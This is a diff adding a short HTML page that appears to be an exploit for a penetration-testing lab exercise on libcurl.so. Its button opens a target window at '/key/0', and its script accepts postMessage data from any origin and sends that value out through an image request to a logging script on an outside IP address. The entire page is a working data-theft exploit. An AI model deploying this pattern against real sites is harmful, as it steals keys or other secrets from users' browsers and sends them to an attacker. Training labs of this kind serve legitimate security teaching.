@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <button onclick='window.open("http://ptl-12065b08-fa3f5dba.libcurl.so/key/0","ptlabdata0","height=200,width=150")'>Decrypt</button>
+        <img id="asdf"></img>
+        <script>
+            window.addEventListener("message", function(event){
+                document.getElementById("asdf").src = "http://18.191.42.249/log.php?c=" + event.data.value;
+            }, false);
+        </script>
+    </body>
+</html>
+
